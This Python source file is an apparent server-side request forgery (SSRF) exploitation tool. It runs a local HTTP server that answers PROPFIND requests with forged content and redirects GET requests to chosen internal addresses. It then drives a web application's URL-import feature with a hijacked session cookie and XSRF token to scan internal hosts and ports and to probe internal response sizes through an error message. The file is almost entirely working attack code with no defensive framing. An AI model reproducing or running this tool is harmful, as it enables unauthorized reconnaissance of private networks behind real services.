import os
import json
import time
import sys
import ctypes
import requests
import threading

from random import choice
from termcolor import colored
from string import ascii_lowercase
from http.server import HTTPServer,SimpleHTTPRequestHandler


START_IMPORT = ""
CHECK_IMPORT = ""
CANCEL_IMPORT = ""


def print_colored(msg):
    msg_type = msg[1]
    match msg_type:
        case "!":
            print(colored(msg, "red"))
        case "*":
            print(colored(msg, "cyan"))
        case "+":
            print(colored(msg, "green"))
        case "%":
            print(colored(msg, "yellow"))
        case _:
            print(msg)



class Queue():
    def __init__(self, length):
        self.list = [None for i in range(length)]
        self.length = length

    def append(self, val):
        temp = self.list[1:]
        temp.append(val)
        self.list = [elem for elem in temp]

    def exists(self, val):
        return val in self.list

    def get_size(self):
        return len([elem for elem in self.list if elem is not None])

    def get_last_n(self, n):
        return self.list[-n:]

    def get_queue(self):
        return self.get_last_n(self.length)


class Handler(SimpleHTTPRequestHandler):
    redirect_location = ""
    request_queue = Queue(10)
    verbose = False
    filename = None
    content_length = 94969
    use_random = True

    def do_PROPFIND(self):
        try:
            Handler.request_queue.append("PROPFIND")

            with open("propfind.xml", "r") as f:
                content = f.read()
            
            if Handler.use_random:
                random_name = "".join(choice(ascii_lowercase) for i in range(12))
                content = content.format(random_name, Handler.content_length)
            else:
                content = content.format(Handler.filename, Handler.content_length)
            
            self.wfile.write(content.encode())
        except Exception as e:
            print_colored(f"[!] Server Exception: {e}")


    def do_GET(self):
        try:
            Handler.request_queue.append("GET")
            
            if Handler.verbose:
                print_colored(f"[+] QUEUE: {Handler.request_queue.get_queue()}")
            
            if Handler.redirect_location[:4] == "http":
                redir = Handler.redirect_location.encode()
            else:
                redir = f"http://{Handler.redirect_location}".encode()

            self.wfile.write(b"HTTP/1.1 302\r\n")
            self.wfile.write(b"Location: %s\r\n" % redir)
            
        except Exception as e:
            print_colored(f"[!] Server Exception: {e}")



class Scanner():
    def __init__(self, server_url, target_list=None, logfile="scan.log", verbose=False):
        self.targets = target_list
        self.logfile = logfile
        self.cookie = os.getenv("COOKIE")
        self.xsrf_token = os.getenv("XSRF_TOKEN")
        self.server_url = server_url
        self.current_target = None
        self.current_import_id = None
        self.scan_results = []
        self.blacklist = []
        self.verbose = verbose

        if self.cookie is None or self.xsrf_token is None:
            print_colored("[!] No COOKIE or XSRF_TOKEN environment variables")
            exit(-1)

        self.headers = {
            "Cookie": self.cookie,
            "Content-Type": "application/json",
            "X-Csrf-Token": self.xsrf_token
        }

        self.server = HTTPServer(("0.0.0.0", 8000), Handler)

        self.server_thread = threading.Thread(target=self.server.serve_forever,args=())
        self.server_thread.start()

        if self.verbose:
            Handler.verbose = True


    def initiate_import(self):
        data  = {
            "url": self.server_url
        }

        r = requests.post(
                START_IMPORT,
                headers=self.headers,
                json=data
                )

        resp = json.loads(r.text)
        #print(r.text)
        #exit()
        self.current_import_id = resp["data"][0]["id"]

        if self.verbose:
            print_colored(f"[+] CURRENT IMPORT ID: {self.current_import_id}")

    def check_import(self, import_id):
        r = requests.get(
            CHECK_IMPORT.format(import_id),
            headers=self.headers
        )
    
        results = json.loads(r.text)
        return results


    def is_import_finished(self, import_id):
        res = self.check_import(import_id)
        return len(res["data"]) == 3



    def is_blacklisted(self, target):
        if target.split(":")[0] in self.blacklist:
            return True
        return False



    def heuristic(self):
        try:
            data = self.check_import(self.current_import_id)["data"]
            if len(data) > 0 and "no such host" in data[0]["message"]:
                self.blacklist.append(self.current_target.split(":")[0])
                return -1
            elif Handler.request_queue.get_size() < 5:
                if len(data) > 0:
                    return 2
                else:
                    return 0
            elif "PROPFIND" not in Handler.request_queue.get_queue() and len(data) == 0:
                return 1
            else:
                return 2
        except Exception as e:
            print_colored(f"[!] Encountered exception in heuristic function: {e}")



    def stop_current_import(self):
        try:
            r = requests.put(
                CANCEL_IMPORT.format(self.current_import_id),
                headers=self.headers
                )
            assert "success" in r.text
        except Exception as e:
            print_colored(f"[!] Encountered exception while stopping import: {e}")
        time.sleep(10)


    def scan(self):
        Handler.redirect_location = self.targets[0]

        for target in self.targets:
            if self.is_blacklisted(target):
                continue

            self.current_target = target
            Handler.redirect_location = target
            
            print_colored(f"[*] Scanning {target}")
            self.initiate_import()

            time.sleep(7)
            self.stop_current_import()
            self.scan_results.append((target, self.heuristic()))

            for _ in range(10):
                Handler.request_queue.append(None)

            self.log_results()
    

    def get(self, url, filename):
        if filename is None:
            filename = url.split("/")[2].replace(":", "-")

        Handler.redirect_location = url
        Handler.filename = filename

        self.initiate_import()
        
        start_time = time.time()
        print_colored("[%] Waiting for Body Length error")

        while len(self.check_import(self.current_import_id)["data"]) == 0:
            #time.sleep(2)
            if time.time() - start_time > 60:
                print_colored("[!] Behaviour indicates port is closed, exiting")
                self.close()
                exit(1)
            continue
        
        try:
            message = self.check_import(self.current_import_id)["data"][0]["error"]

            real_length = int(message.split("Body length ")[1])
            print_colored(f"[+] Length recieved: {real_length}")

            Handler.content_length = real_length
            Handler.use_random = False

            #self.initiate_import()
            time.sleep(30)

        except:
            print_colored(f"[*] No content, recieved {message}")
            self.close()
            exit(1)
        



    def log_results(self):
        file = open(self.logfile, "a+")
        res = self.scan_results[-1]
        
        if res[1] == -1:
            print_colored(f"[!] {res[0]}: DNS error")
            file.write(f"- {res[0]}: DNS error\n")
        elif res[1] == 0:
            print_colored(f"[%] {res[0]}: Host down")
            file.write(f"! {res[0]}: Host down\n")
        elif res[1] == 1:
            print_colored(f"[*] {res[0]}: Host up, port closed")
            file.write(f"* {res[0]}: Host up, port closed\n")
        elif res[1] == 2:
            print_colored(f"[+] {res[0]}: Host up, port open")
            file.write(f"+ {res[0]}: Host up, port open\n")

        file.close()


    def close(self):
        print_colored("[*] Stopping import")
        self.stop_current_import()

        print_colored("[*] Shutting down server")
        target_tid = ctypes.c_long(self.server_thread.ident)
        exc = ctypes.py_object(SystemExit)
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(target_tid, exc)
